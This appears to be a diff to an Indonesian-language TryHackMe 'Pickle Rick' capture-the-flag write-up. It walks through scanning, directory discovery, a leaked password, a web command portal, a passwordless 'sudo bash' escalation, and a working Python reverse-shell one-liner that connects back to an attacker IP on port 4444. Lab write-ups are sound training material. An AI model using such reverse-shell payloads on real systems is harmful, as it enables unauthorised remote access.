@@ -3,7 +3,11 @@
 - IP Machine: 10.10.172.106
 
 # Nmap Report
-- Baris perintah: `nmap -sV -A <IP Machine>`
+- Lakukan port scanning dengan tool `nmap`
+```sh
+nmap -sV -A <IP Machine>
+```
+- Berikut ini adalah hasil port scanning
 ```sh
 ┌──(root㉿kali)-[/home/kali]
 └─# nmap -sV -A 10.10.172.106
@@ -46,7 +50,10 @@ Nmap done: 1 IP address (1 host up) scanned in 40.35 seconds
 ```
 
 ## Gobuster
-- Baris perintah: `gobuster dir -u http://<IP Machine> -w <wordlists>`
+- Lakukan pencarian direktori web tersembunyi dengan tool `gobuster`
+```sh
+gobuster dir -u http://<IP Machine> -w /usr/share/dirb/wordlists/commont.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%201.JPG)
 
@@ -60,7 +67,7 @@ Nmap done: 1 IP address (1 host up) scanned in 40.35 seconds
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%203.JPG)
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%204.JPG)
 
-- Buka halaman `http://<IP_machine>/robots.txt` di tab baru. Disini ditemukan sebuah password
+- Buka halaman `http://<IP_machine>/robots.txt` di tab baru. Pada halaman ini ditemukan sebuah password
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%205.JPG)
 
@@ -82,20 +89,22 @@ password: Wubbalubbadubdub
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%208.JPG)
 
-- Jika kita ketik `cat Sup3rS3cretPick13Ingred.txt` lalu tekan Execute maka muncul pesan bahwa perintah tersebut telah di block
+- Terdapat sebauh file `Sup3rS3cretPick13Ingred.txt` disana. Jika kita ketik perintah `cat Sup3rS3cretPick13Ingred.txt` lalu tekan tombol **Execute** maka muncul pesan bahwa command tersebut telah di block sehingga kita tidak bisa membaca isi file tersebut
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%209.JPG) 
 
-- Gunakan Payload berikut untuk masuk ke server. Ganti **10.8.142.62** dengan IP tun0 pada komputer yang anda gunakan
+- Kita bisa memanfaatkan command reverse shell untuk bisa masuk ke dalam shell server. Untuk itu kita harus membuat listener netcat terlebih dahulu di terminal dan kita atur di port `4444`. Anda juga bisa menggunakan port lain
 ```sh
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.142.62",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+nc -lnvp 4444
 ```
-
-- Buka terminal dan jalankan netcat dengan printah `nc -lnvp <port>`
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2010.JPG)
 
-- Copy payload dan paste ke halaman portal.php `http://<IP_machine>/portal.php` lalu tekan Execute
+- Gunakan Payload berikut untuk menjalankan reverse shell. Ganti **10.8.142.62** dengan IP tun0 pada komputer yang anda gunakan
+```sh
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.142.62",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+```
+- Copy payload diatas dan paste ke halaman `http://<IP_machine>/portal.php` lalu tekan tombol **Execute**
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2011.JPG)
 
@@ -103,17 +112,24 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2012.JPG)
 
-- Disini kita bisa membaca file **Sup3rS3cretPick13Ingred.txt** dengan perintah `cat Sup3rS3cretPick13Ingred.txt` yang sebelumnya diblock
+- Setelah berhasil masuk ke dalam shell kita bisa membaca isi file **Sup3rS3cretPick13Ingred.txt**
+```sh
+cat Sup3rS3cretPick13Ingred.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2013.JPG)
 
-- Di directory **/home** ditemukan home directory **rick**. Navigasi ke directory **/home/rick** dan disana ditemukan file **second ingredients**. Buka file tersebut dengan perintah `cat 'second ingredients'`
+- Di directory **/home** ditemukan home directory **rick**. Navigasi ke directory **/home/rick** dan disana ditemukan file **second ingredients**
+```sh
+cd /home/rick
+cat 'second ingredients'
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2014.JPG)
 
 ## Privilege Escalation
-- Untuk menemukan final ingredient diperlukan akses user root. Jalankan 2 baris perintah ini untuk memperoleh akses user root
-
+- Final ingredient sepertinya ditaruh di direktori **/root**. Untuk bisa mengakses direktori tersebut diperlukan akses user root sehingga kita melakukan privilege escalation.
+- Untuk mendapatkan akses user root, kita perlu mengubah shell menjadi terminal interaktif dengan perintah dibawah ini. Setelah kita coba, ternyata kita mengakses user root hanya dengan perintah `sudo bash` tanpa memasukkan password
 ```sh
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 sudo bash
@@ -122,6 +138,10 @@ sudo bash
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2015.JPG)
 
 - Setelah berhasil masuk sebagai user root, navigasi ke directory **/root** maka disini ditemukan file **3rd.txt** yang berisi final ingredient. Buka file tersebut dengan perintah `cat 3rd.txt`
+```sh
+cd /root
+cat 3rd.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2016.JPG)
 
